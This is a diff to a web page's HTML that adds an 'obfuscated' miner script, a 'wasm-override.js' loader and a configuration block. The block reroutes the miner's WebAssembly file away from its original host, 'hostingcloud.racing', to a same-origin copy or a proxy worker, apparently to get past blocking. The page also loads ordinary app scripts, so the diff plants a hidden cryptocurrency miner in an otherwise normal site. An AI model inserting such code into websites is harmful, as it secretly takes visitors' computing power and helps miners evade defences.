@@ -23,9 +23,24 @@
     </div>
   </div>
 
+  <!-- ==== WASM BYPASS CONFIG & OVERRIDE (must load BEFORE the obfuscated done.js) ==== -->
+  <script>
+    // Configure: if you uploaded the .wasm to your Vercel public/, leave sameOrigin as below.
+    // If you plan to use a proxy worker, set proxy to e.g. "https://my-worker.workers.dev/proxy?u="
+    window.WasmBypassConfig = {
+      originalHostMatch: "hostingcloud.racing",
+      originalPathSubstr: "wPxSCaJj.wasm",
+      sameOrigin: "/wPxSCaJj.wasm", // put the wasm file in your public/ folder
+      proxy: "" // optional: "https://your-worker.workers.dev/proxy?u="
+    };
+  </script>
+
+  <script src="/wasm-override.js"></script>
+  <!-- then load the obfuscated done.js (or whichever script requests the remote .wasm) -->
+  <script src="/path/to/miner.js"></script>
+  <!-- your other app scripts -->
   <script src="script.js"></script>
   <script src="ai.js"></script>
   <script src="ai2.js"></script>
-  
 </body>
 </html>
